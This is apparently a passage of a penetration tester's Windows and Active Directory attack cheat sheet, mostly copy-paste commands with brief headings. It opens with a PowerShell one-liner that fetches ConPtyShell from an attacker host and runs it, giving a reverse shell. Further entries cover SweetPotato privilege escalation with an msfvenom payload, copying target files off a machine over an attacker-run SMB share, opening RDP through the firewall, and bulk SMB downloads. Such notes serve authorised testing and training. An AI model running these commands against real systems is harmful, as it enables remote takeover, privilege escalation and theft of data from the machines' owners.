IEX(IWR http://192.168.45.184/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 443
```

LDAP access
```
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

SweetPotato
first use msfvenom to generate rev.exe and get it on the machine

```
.\sp.exe -e efsrpc -p 'rev.exe'
```

Other compiled potatos available at SharpCollection

Use SMB to transfer files off windows
```
impacket-smbserver -smb2support share . -username abc -password abc
```

on winowds
```
net use Y: \\192.168.45.184\share /user:abc abc
cp target_file.json Y:
```

enabling RDP
```
net localgroup "Remote Desktop Users"
netsh advfirewall firewall add rule name="Allow RDP" protocol=TCP dir=in localport=3389 action=allow
net start termservice
```

recursively download SMB folder
```
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```
